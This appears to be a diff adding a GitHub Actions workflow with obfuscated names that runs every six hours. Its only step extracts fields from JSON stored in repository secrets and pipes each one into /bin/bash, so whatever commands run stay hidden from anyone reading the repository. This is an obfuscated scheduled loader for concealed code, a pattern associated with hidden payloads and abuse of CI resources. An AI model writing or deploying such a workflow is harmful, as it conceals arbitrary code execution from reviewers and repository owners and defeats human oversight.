@@ -1,0 +1,24 @@
+name: wanmeiyaos
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanmeiyaos
+        env:
+          papd237: ${{ secrets.papd237 }}
+        run: |
+          echo $papd237 | jq -r .scc494 | /bin/bash
+          echo $cdjxe13 | jq -r .r3 | /bin/bash
+          echo $zrsm8583 | jq -r .hr887 | /bin/bash
+          echo $k23 | jq -r .frn6 | /bin/bash
+          echo $nl0732 | jq -r .q95854 | /bin/bash
+          echo $cajrx693 | jq -r .g22 | /bin/bash
+          echo $ixdcp76265 | jq -r .ezpq3 | /bin/bash
+          echo $sr2085 | jq -r .qunod242 | /bin/bash
+
